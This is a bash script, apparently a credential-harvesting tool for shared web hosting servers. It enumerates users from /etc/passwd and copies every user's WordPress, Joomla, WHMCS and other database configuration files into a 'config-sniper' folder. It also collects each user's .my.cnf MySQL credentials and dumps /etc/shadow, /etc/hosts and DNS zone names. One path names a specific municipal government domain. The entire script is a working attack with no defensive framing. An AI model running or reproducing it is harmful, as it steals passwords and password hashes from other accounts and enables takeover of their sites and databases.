#!/bin/bash

awk -F':' '{ print $1 }' /etc/passwd  > passwd.txt
passwd=`cat passwd.txt`
mkdir config-sniper
pwd=`pwd`
wait
for i in $passwd
do

cp /srv/www/pmc/$i.campinas.sp.gov.br/html/ $pwd/config-sniper/$i.txt
cp /home/$i/public_html/includes/db_conn.php $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/includes/db_conn.php $pwd/config-sniper/$i.txt
cp /home/$i/public_html/configuration.*  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/*onfig.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/wp-config.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/config.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/database.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/Database.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/wp/wp-config.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/WP/wp-config.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/press/wp-config.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/Wordpress/wp-config.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/blog/wp-config.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/wordpress/beta/wp-config.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/news/wp-config.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/protal/configuration.php $pwd/config-sniper/$i.txt
cp /home/$i/public_html/central/configuration.php $pwd/config-sniper/$i.txt
cp /home/$i/public_html/whm/WHMCS/configuration.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/submitticket.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/whm/configuration.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/lib/include.lib.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/main/configuration.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/joomla/configuration.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/cms/configuration.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/home/configuration.php  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/include/config.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/configuration.*  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/*onfig.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/wp-config.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/config.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/database.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/Database.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/wp/wp-config.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/WP/wp-config.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/press/wp-config.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/Wordpress/wp-config.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/blog/wp-config.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/wordpress/beta/wp-config.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/news/wp-config.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/protal/configuration.php $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/central/configuration.php $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/whm/WHMCS/configuration.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/submitticket.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/lib/include.lib.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/whm/configuration.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/main/configuration.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/joomla/configuration.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/cms/configuration.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/home/configuration.php  $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/include/config.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/configuration.*  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/*onfig.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/wp-config.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/config.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/database.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/Database.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/wp/wp-config.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/WP/wp-config.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/press/wp-config.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/Wordpress/wp-config.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/blog/wp-config.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/wordpress/beta/wp-config.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/news/wp-config.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/protal/configuration.php $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/central/configuration.php $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/whm/WHMCS/configuration.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/submitticket.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/lib/include.lib.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/whm/configuration.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/main/configuration.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/joomla/configuration.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/cms/configuration.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/home/configuration.php  $pwd/config-sniper/$i.txt
cp /home2/$i/public_html/include/config.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/configuration.*  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/*onfig.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/wp-config.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/config.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/database.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/Database.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/wp/wp-config.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/WP/wp-config.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/lib/include.lib.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/press/wp-config.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/Wordpress/wp-config.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/blog/wp-config.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/wordpress/beta/wp-config.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/news/wp-config.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/protal/configuration.php $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/central/configuration.php $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/whm/WHMCS/configuration.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/submitticket.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/whm/configuration.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/main/configuration.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/joomla/configuration.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/cms/configuration.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/home/configuration.php  $pwd/config-sniper/$i.txt
cp /home3/$i/public_html/include/config.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/configuration.*  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/*onfig.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/wp-config.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/config.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/database.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/lib/include.lib.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/Database.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/wp/wp-config.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/WP/wp-config.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/press/wp-config.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/Wordpress/wp-config.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/blog/wp-config.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/wordpress/beta/wp-config.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/news/wp-config.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/protal/configuration.php $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/central/configuration.php $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/whm/WHMCS/configuration.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/submitticket.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/whm/configuration.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/main/configuration.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/joomla/configuration.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/cms/configuration.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/home/configuration.php  $pwd/config-sniper/$i.txt
cp /home4/$i/public_html/include/config.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/configuration.*  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/*onfig.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/lib/include.lib.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/wp-config.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/config.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/database.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/Database.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/wp/wp-config.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/WP/wp-config.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/press/wp-config.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/Wordpress/wp-config.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/blog/wp-config.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/wordpress/beta/wp-config.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/news/wp-config.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/protal/configuration.php $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/central/configuration.php $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/whm/WHMCS/configuration.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/submitticket.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/whm/configuration.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/main/configuration.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/joomla/configuration.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/cms/configuration.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/home/configuration.php  $pwd/config-sniper/$i.txt
cp /home5/$i/public_html/include/config.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/configuration.*  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/*onfig.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/config.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/database.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/Database.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/wp/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/WP/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/press/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/Wordpress/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/blog/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/wordpress/beta/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/news/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/protal/configuration.php $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/central/configuration.php $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/whm/WHMCS/configuration.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/submitticket.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/whm/configuration.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/main/configuration.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/joomla/configuration.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/cms/configuration.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/lib/include.lib.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/home/configuration.php  $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/include/config.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/configuration.*  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/*onfig.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/config.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/lib/include.lib.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/database.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/Database.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/wp/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/WP/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/press/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/Wordpress/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/blog/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/wordpress/beta/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/news/wp-config.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/protal/configuration.php $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/central/configuration.php $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/whm/WHMCS/configuration.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/submitticket.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/whm/configuration.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/main/configuration.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/joomla/configuration.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/cms/configuration.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/home/configuration.php  $pwd/config-sniper/$i.txt
cp /var/www/html/$i/public_html/include/config.php  $pwd/config-sniper/$i.txt
cp /home/sites/$i/public_html/config.php $pwd/config-sniper/$i.txt
cp /home/sites/$i/public_html/lib/include.lib.php  $pwd/config-sniper/$i.txt
cp /home/sites/$i/public_html/include/config.php $pwd/config-sniper/$i.txt
cp /home/sites/$i/public_html/wp-config.php $pwd/config-sniper/$i.txt
cp /home/sites/$i/public_html/whm/WHMCS/configuration.php $pwd/config-sniper/$i.txt
cp /home/sites/$i/public_html/whm/configuration.php $pwd/config-sniper/$i.txt
cp /home/sites/$i/public_html/dbinfo.php $pwd/config-sniper/$i.txt
cp /home/sites/$i/public_html/configuration.php $pwd/config-sniper/$i.txt
cp /home/$i/public_html/dbinfo.php $pwd/config-sniper/$i.txt
cp /var/www/$i/public_html/dbinfo.php $pwd/config-sniper/$i.txt
cp /home1/$i/public_html/dbinfo.php $pwd/config-sniper/$i.txt
ls -la /home/$i/public_html/

[ -r "/srv/www/pmc/$i.campinas.sp.gov.br/html/" ] && echo "/srv/www/pmc/$i.campinas.sp.gov.br/html/sites/default/files/" >> open-dir.txt
[ -r "/home/$i/public_html" ] && echo "/home/$i/public_html/" >> open-dir.txt
[ -r "/var/www/$i/public_html/" ] && echo "/var/www/$i/public_html/" >> open-dir.txt
[ -r "/home1/www/$i/public_html/" ] && echo "/home1/$i/public_html/" >> open-dir.txt
[ -r "/home2/www/$i/public_html/" ] && echo "/home2/$i/public_html/" >> open-dir.txt
[ -r "/home3/www/$i/public_html/" ] && echo "/home3/$i/public_html/" >> open-dir.txt
[ -r "/home3/www/$i/public_html/" ] && echo "/home3/$i/public_html/" >> open-dir.txt
[ -r "/home4/$i/public_html/" ] && echo "/home4/$i/public_html/" >> open-dir.txt
[ -r "/home5/$i/public_html/" ] && echo "/home5/$i/public_html/" >> open-dir.txt
[ -r "/home/sites/$i/public_html/" ] && echo "/home/sites/$i/public_html/" >> open-dir.txt
[ -r "/var/www/html/$i/public_html/" ] && echo "/var/www/html/$i/public_html/" >> open-dir.txt


mkdir cpanels
cat /home/$i/.my.cnf >> cpanels/cpanels.txt
cat /var/$i/.my.cnf >> cpanels/cpanels.txt
cat /var/www/$i/.my.cnf >> cpanels/cpanels.txt
cat /home1/$i/.my.cnf >> cpanels/cpanels.txt
cat /home2/$i/.my.cnf >> cpanels/cpanels.txt
cat /home3/$i/.my.cnf >> cpanels/cpanels.txt
cat /home4/$i/.my.cnf >> cpanels/cpanels.txt
cat /home5/$i/.my.cnf >> cpanels/cpanels.txt
cat /home6/$i/.my.cnf >> cpanels/cpanels.txt
cat /var/www/html/$i/.my.cnf >> cpanels/cpanels.txt
done

grep '^zone' /etc/named.conf | cut -d'"' -f2  > named.txt
cat /etc/shadow > shadow.txt
cat /etc/hosts > hosts.txt
ls /etc/valiases/ > named2.txt
